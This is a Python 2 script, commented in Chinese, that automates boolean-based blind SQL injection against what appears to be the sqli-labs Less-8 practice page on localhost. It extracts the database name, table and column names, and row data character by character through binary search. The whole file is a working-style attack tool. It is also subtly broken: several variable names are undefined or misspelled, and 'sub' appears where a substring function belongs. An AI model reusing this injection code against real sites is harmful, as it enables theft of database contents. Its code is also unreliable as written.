#!/usr/bin/env python

import urllib2
import urllib

url = "http://localhost/sqli/Less-8/index.php?id=1"
selectDB = "users"

ascii_payload = "and ascii(sub((%s), %d, 1)>=%d %23"
length_payload = "and length(%s)>=%d %23"
selectTableCount_payload = "and (select count(table_name)from information_schema.tables where table_schema='%s' limit"
selectTableNameLengthPaylosdfront = "and (select length(table_name) from information_schema.tables where table_schema='%s' limit "
selectTableNameLengthPayloadbehind = ",1)>=%d %23"


def getLengthResult(payload, string, length):
	finalUrl = url + urllib.quote(payload % (string, length))
	res = urllib2.urlopen(finalUrl)
	if "You are in" in res.read():
		return True
	else:
	 	return False

def getResult(payload,string, pos,ascii):
	finalUrl = url + urllib.quote(payload % (string, pos, ascii))
	res = urllib2.urlopen(finalUrl)
	if "You are in" in res.read():
		return True
	else:
		return False
	

def inject():

	lengthOfDBName = getLengthOfString(lengthPayload, database)
	print "length of DBname: " + str(lengthOfDBName)
	# 获取数据库名称
	DBname = getName(asciiPayload, selectDB, lengthOfDBName)
	
	print "current database:" + DBname

	# 获取数据库中的表的个数
	tableCount = getLengthOfString(selectTableCountPayload, DBname)
	print "count of talbe:" + str(tableCount)

	# 获取数据库中的表
	for i in xrange(0,tableCount):
		# 第几个表
		num = str(i)
		# 获取当前这个表的长度
		selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind
		tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)
		print "current table length:" + str(tableNameLength)
		# 获取当前这个表的名字
		selectTableName = selectTable%(DBname, i)
		tableName = getName(asciiPayload, selectTableName ,tableNameLength)
		print tableName


	selectColumnCountPayload = "'and (select count(column_name) from information_schema.columns where table_schema='"+ DBname +"' and table_name='%s')>=%d #"
	# print selectColumnCountPayload
	# 获取指定表的列的数量
	columnCount = getLengthOfString(selectColumnCountPayload, getTable)
	print "table:" + getTable + " --count of column:" + str(columnCount)

	# 获取该表有多少行数据
	dataCountPayload = "'and (select count(*) from %s)>=%d #"
	dataCount = getLengthOfString(dataCountPayload, getTable)
	print "table:" + getTable + " --count of data: " + str(dataCount)

	data = []
	# 获取指定表中的列
	for i in xrange(0,columnCount):
		# 获取该列名字长度
		selectColumnNameLengthPayload = "'and (select length(column_name) from information_schema.columns where table_schema='"+ DBname +"' and table_name='%s' limit "+ str(i) +",1)>=%d #"
		# print selectColumnNameLengthPayload
		columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)
		print "current column length:" + str(columnNameLength)
		# 获取该列的名字
		selectColumn = "select column_name from information_schema.columns where table_schema='"+ DBname +"' and table_name='%s' limit %d,1"
		selectColumnName = selectColumn%(getTable, i)
		# print selectColumnName
		columnName = getName(asciiPayload, selectColumnName ,columnNameLength)
		print columnName

		tmpData = []
		tmpData.append(columnName)
		# 获取该表的数据
		for j in xrange(0,dataCount):
			columnDataLengthPayload = "'and (select length("+ columnName +") from %s limit " + str(j) + ",1)>=%d #"
			# print columnDataLengthPayload
			columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)
			# print columnDataLength
			selectData = "select " + columnName + " from users limit " + str(j) + ",1"
			columnData = getName(asciiPayload, selectData, columnDataLength)
			# print columnData
			tmpData.append(columnData)
	
		data.append(tmpData)

	
	# 输出列名
	tmp = ""
	for i in xrange(0,len(data)):
		tmp += data[i][0] + "	"
	print tmp
	# 输出具体数据
	for j in xrange(1,dataCount+1):
		tmp = ""
		for i in xrange(0,len(data)):
			tmp += data[i][j] + "	"
		print tmp
	
# 获取字符串的长度			
def getLengthOfString(payload, string):
	# 猜长度
	lengthLeft = 0
	lengthRigth = 0
	guess = 10
	# 确定长度上限，每次增加5
	while 1:
		if getLengthResult(payload, string, guess) == True:
			guess = guess + 5	
		else:
			lengthRigth = guess
			break
	
	# 二分法查长度
	mid = (lengthLeft + lengthRigth) / 2
	while lengthLeft < lengthRigth - 1:
		if getLengthResult(payload, string, mid) == True:
			lengthLeft = mid
		else: 
			lengthRigth = mid
		# 更新中值
		mid = (lengthLeft + lengthRigth) / 2		
	
	return lengthLeft

# 获取名称
def getName(payload, string, lengthOfString):
	tmp = ''
	for i in xrange(1,lengthOfString+1):
# 32是空格，是第一个可显示的字符，127是delete，最后一个字符
		left = 32 
		right = 127
		mid = (left + right) / 2
		while left < right - 1:
			if getResult(payload, string, i, mid) == True:
				left = mid
				mid = (left + right) / 2
			else:
				right = mid
			# 更新中值
			mid = (left + right) / 2
		tmp += chr(left)
		# print tmp
	return tmp	
		

def main():
	inject()

if __name__ == "__main__":
	main()
